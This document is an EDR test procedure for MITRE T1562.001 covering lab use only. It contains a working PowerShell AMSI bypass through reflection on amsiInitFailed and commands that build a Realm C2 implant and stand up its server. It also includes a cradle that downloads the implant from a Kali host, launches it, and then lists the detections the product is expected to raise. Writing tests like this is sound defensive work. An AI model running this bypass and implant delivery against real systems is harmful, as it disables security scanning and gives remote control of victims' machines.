# Test: Evasion — AMSI bypass then cradle the implant (T1562.001)

**Chain:** blind AMSI *inside* a PowerShell session, then deliver the implant — the
download that the platform was supposed to inspect happens blind. Tests that your EDR's
detections don't depend on AMSI.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).


**Victim (elevated PowerShell):** `.\test.ps1 -Kali 172.16.69.109`

```powershell
# 1. blind AMSI (public in-script technique - NOT on the command line)
$t=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f=$t.GetField('amsiInitFailed','NonPublic,Static'); $f.SetValue($null,$true)
# 2. deliver + launch as usual
IWR http://172.16.69.109:8000/sysupd.exe -OutFile $env:TEMP\sysupd.exe
Start-Process $env:TEMP\sysupd.exe
```

**Expected alerts:**

| Rule | Sev | Trigger |
|---|---|---|
| PS **4104** script-block event | info | PowerShell operational log records the bypass block itself — your evidence trail |
| `PROC-NOPS-AMSI` | high | only fires if the bypass rides the *command line* — this one doesn't (by design) |
| `SIG-*` + `EVT-4688-TEMP` + `PROG-IMPLANT-LAUNCH` + `NET-BEACON` | ✓ | **all still fire** — your EDR never depended on AMSI |

**The architectural point:** AMSI protects *other* products' content inspection; your
file/launch/network detections are independent of it. The bypass changes nothing for you —
this test proves it live.

**Cleanup:** global cleanup.
